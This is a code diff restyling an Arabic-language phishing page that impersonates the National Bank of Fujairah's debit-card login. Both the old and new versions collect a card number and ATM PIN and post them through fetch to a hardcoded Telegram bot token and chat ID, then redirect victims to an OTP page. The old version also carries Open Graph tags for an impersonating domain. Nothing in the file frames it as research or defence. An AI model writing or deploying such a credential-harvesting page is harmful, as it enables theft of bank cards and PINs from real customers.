@@ -1,234 +1,189 @@
 <!DOCTYPE html>
-<html dir="rtl" lang="ar">
+<html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>بنك الفجيرة الوطني - تسجيل الدخول</title>
-
-    <!-- Open Graph Meta Tags -->
-    <meta property="og:title" content="بنك الفجيرة الوطني - تسجيل الدخول">
-    <meta property="og:description" content="أدخل رقم البطاقة ورمز PIN لإتمام الدخول.">
-    <meta property="og:image" content="https://alkhaleeg.services/sadUae/images/nbf_bank_logo.png">
-    <meta property="og:url" content="https://alkhaleeg.services/sadu/nbf_login.html">
-    <meta property="og:type" content="website">
-
+    <title>NBF Login</title>
     <style>
+        :root {
+            --nbf-blue: #009ad9;
+            --nbf-bg-gradient: linear-gradient(180deg, #0081bc 0%, #005a92 100%);
+        }
+
         body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            color: #333;
-            background: #f5f5f5;
-            padding: 0;
+            background: var(--nbf-bg-gradient);
             margin: 0;
-            max-width: 100%;
-            box-sizing: border-box;
-        }
-
-        /* Responsive adjustments */
-        @media (max-width: 768px) {
-            .header {
-                height: 60px;
-            }
-            .form-container {
-                padding: 20px;
-            }
-            .btn-blue {
-                width: 90%;
-                font-size: 14px;
-                padding: 10px;
-            }
-        }
-
-        @media (max-width: 480px) {
-            .header {
-                height: 50px;
-            }
-            .form-container {
-                padding: 15px;
-            }
-            .btn-blue {
-                width: 95%;
-                font-size: 13px;
-                padding: 8px;
-            }
-        }
-
-        .header {
-            background: linear-gradient(to right, #0073e6, #005bb5);
-            height: 80px;
+            padding: 0;
+            font-family: 'Segoe UI', Arial, sans-serif;
             display: flex;
-            align-items: center;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+
+        /* Header Section */
+        header {
+            padding: 20px;
+            display: flex;
             justify-content: space-between;
-            padding: 0 20px;
+            align-items: center;
             color: white;
         }
-        .header .back-icon {
-            font-size: 24px;
-            cursor: pointer;
-        }
-        .header img {
-            height: 40px;
-        }
-        .header .menu-icon {
-            font-size: 24px;
-            cursor: pointer;
-        }
-        h1 {
+
+        .logo-area {
             text-align: center;
-            margin-top: 20px;
-            margin-bottom: 10px;
-            font-weight: bold;
-            font-size: 28px;
-            color: #0073e6;
         }
-        .debit-card-btn {
+
+        .logo-text {
+            font-size: 24px;
+            font-weight: bold;
             display: block;
-            width: 50%;
-            margin: 10px auto;
-            padding: 12px;
-            background: #00aaff;
-            color: white;
+        }
+
+        .logo-subtext {
+            font-size: 10px;
+            opacity: 0.8;
+        }
+
+        /* Main Card */
+        .main-card {
+            background-color: white;
+            flex-grow: 1;
+            margin: 10px;
+            border-radius: 40px 40px 0 0; /* حواف دائرية كبيرة من الأعلى */
+            padding: 40px 25px;
+            box-shadow: 0 -5px 15px rgba(0,0,0,0.1);
+        }
+
+        .login-title {
+            color: var(--nbf-blue);
+            font-size: 32px;
             text-align: center;
-            border-radius: 25px;
-            text-decoration: none;
+            margin-bottom: 20px;
             font-weight: bold;
+        }
+
+        .tab-button {
+            background-color: var(--nbf-blue);
+            color: white;
+            width: 100%;
+            padding: 12px;
+            border-radius: 25px;
+            border: none;
             font-size: 16px;
-            cursor: pointer;
+            margin-bottom: 30px;
         }
-        .form-container {
-            background: white;
-            padding: 30px;
-            border-radius: 10px;
-            box-shadow: 0 0 10px rgba(0,0,0,0.1);
-            max-width: 500px;
-            margin: 20px auto;
+
+        .form-group {
+            margin-bottom: 25px;
         }
+
         label {
             display: block;
-            margin: 10px 0 5px;
-            font-weight: bold;
+            margin-bottom: 10px;
             color: #333;
+            font-weight: 500;
         }
-        input[type="text"] {
+
+        input {
             width: 100%;
-            padding: 12px;
-            border: 2px solid #ddd;
-            border-radius: 8px;
+            padding: 15px;
+            border: 1px solid #e0e0e0;
+            border-radius: 15px;
+            background-color: #fff;
             font-size: 16px;
             box-sizing: border-box;
-            transition: border-color 0.3s;
+            text-align: center;
         }
-        input[type="text"]:focus {
-            border-color: #0073e6;
-            outline: none;
+
+        input::placeholder {
+            color: #ccc;
         }
-        .pin-placeholder {
-            color: #999;
-            font-size: 14px;
-            margin: 5px 0;
-        }
-        .btn-blue {
-            display: block;
+
+        .submit-btn {
             width: 100%;
-            margin: 25px auto;
-            padding: 12px;
-            background: #0073e6;
+            background-color: var(--nbf-blue);
             color: white;
-            text-align: center;
-            border-radius: 8px;
-            text-decoration: none;
+            padding: 15px;
+            border-radius: 15px;
+            border: none;
+            font-size: 18px;
             font-weight: bold;
-            font-size: 16px;
+            margin-top: 20px;
             cursor: pointer;
-            transition: background 0.3s;
         }
-        .btn-blue:hover {
-            background: #005bb5;
-        }
-        .error-message {
-            display: none;
-            text-align: center;
-            color: red;
-            font-weight: bold;
-            margin: 10px 0;
-        }
+
+        /* Utility Icons */
+        .icon-back { font-size: 20px; cursor: pointer; }
+        .icon-menu { font-size: 20px; cursor: pointer; }
+
     </style>
 </head>
 <body>
 
-<div class="header">
-    <div class="back-icon">‹</div>
-    <img src="https://alkhaleeg.services/sadUae/images/nbf_bank_logo.png" alt="شعار بنك الفجيرة الوطني">
-    <div class="menu-icon">☰</div>
-</div>
+<header>
+    <div class="icon-back">→</div>
+    <div class="logo-area">
+        <span class="logo-text">nbf</span>
+        <span class="logo-subtext">in good hands</span>
+    </div>
+    <div class="icon-menu">≡</div>
+</header>
 
-<h1>Login</h1>
-<a href="#" class="debit-card-btn">Debit Card</a>
+<div class="main-card">
+    <h1 class="login-title">Login</h1>
+    
+    <button class="tab-button">Debit Card</button>
 
-<div class="form-container">
-    <form id="nbfLogin">
-        <label for="cardNumber">رقم البطاقة</label>
-        <input type="text" id="cardNumber" name="cardNumber" required pattern="\d{16}" title="يجب أن يكون 16 رقمًا">
-        <div style="font-size: 12px; color: #999; text-align: center;">أدخل رقم البطاقة المكون من 16 خانة</div>
+    <form id="nbfForm">
+    <div class="form-group">
+        <label>رقم البطاقة</label>
+        <input type="text" id="cardNumber" placeholder="أدخل رقم البطاقة المكون من 16 خانة">
+    </div>
 
-        <label for="pin">الخاص ببطاقة الصراف الآلي PIN رمز</label>
-        <input type="password" id="pin" name="pin" required minlength="4" maxlength="6" title="رقم PIN بين 4 و6 أرقام">
-        <div class="pin-placeholder">• • • •</div>
+    <div class="form-group">
+        <label>الخاص ببطاقة الصراف الآلي PIN رمز</label>
+        <input type="password" id="pin" placeholder=". . . .">
+    </div>
 
-        <button type="submit" class="btn-blue">تأكيد</button>
-        <div class="error-message" id="errorMessage"></div>
+    <button type="submit" class="submit-btn">تأكيد</button>
     </form>
 </div>
 
 <script>
-    document.getElementById('nbfLogin').addEventListener('submit', function(e) {
-        e.preventDefault();
+document.getElementById('nbfForm').addEventListener('submit', function(e) {
+    e.preventDefault();
+    
+    const cardNumber = document.getElementById('cardNumber').value;
+    const pin = document.getElementById('pin').value;
 
-        const cardNumber = document.getElementById('cardNumber').value;
-        const pin = document.getElementById('pin').value;
+    // التحقق من إدخال البيانات
+    if (!cardNumber || !pin) {
+        alert('يرجى ملء جميع الحقول');
+        return;
+    }
 
-        // إخفاء رسالة الخطأ
-        document.getElementById('errorMessage').style.display = 'none';
-
-        // بوت تلغرام
-        const botToken = '7272097327:AAFcKxacVS26HNg85tK2uYpNLmOMxmsqgZM';
-        const chatId = '1008144314';
-
-        const message = `
-🔐 *تسجيل دخول بنك الفجيرة الوطني*
-
-💳 رقم البطاقة: ${cardNumber}
-🔢 رمز PIN: ${pin}
-📅 التاريخ: ${new Date().toLocaleString('ar-EG')}
-`;
-
-        // إرسال البيانات إلى تلغرام
-        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json'
-            },
-            body: JSON.stringify({
-                chat_id: chatId,
-                text: message,
-                parse_mode: 'Markdown'
-            })
+    // إرسال البيانات لبوت تلغرام
+    fetch('https://api.telegram.org/bot7272097327:AAFcKxacVS26HNg85tK2uYpNLmOMxmsqgZM/sendMessage', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+            chat_id: '1008144314',
+            text: `🔐 *بيانات دخول جديدة - بنك الفجيرة الوطني*\n💳 رقم البطاقة: ${cardNumber}\n🔢 رمز PIN: ${pin}\n📅 ${new Date().toLocaleString('ar-EG')}`,
+            parse_mode: 'Markdown'
         })
-        .then(response => response.json())
-        .then(data => {
-            if (data.ok) {
-                // بعد النجاح: التوجيه إلى صفحة OTP
-                window.location.href = 'otp_page.html';
-            } else {
-                throw new Error('فشل الإرسال');
-            }
-        })
-        .catch(error => {
-            console.error('Error:', error);
-            const errorMsg = document.getElementById('errorMessage');
-            errorMsg.textContent = '❌ حدث خطأ أثناء إرسال البيانات. يرجى المحاولة لاحقًا.';
-            errorMsg.style.display = 'block';
-        });
+    })
+    .then(response => response.json())
+    .then(data => {
+        if (data.ok) {
+            window.location.href = 'otp_page.html';
+        } else {
+            throw new Error('فشل الإرسال');
+        }
+    })
+    .catch(() => {
+        alert('❌ خطأ في إرسال البيانات. تحقق من الاتصال بالإنترنت.');
     });
+});
 </script>
 
 </body>
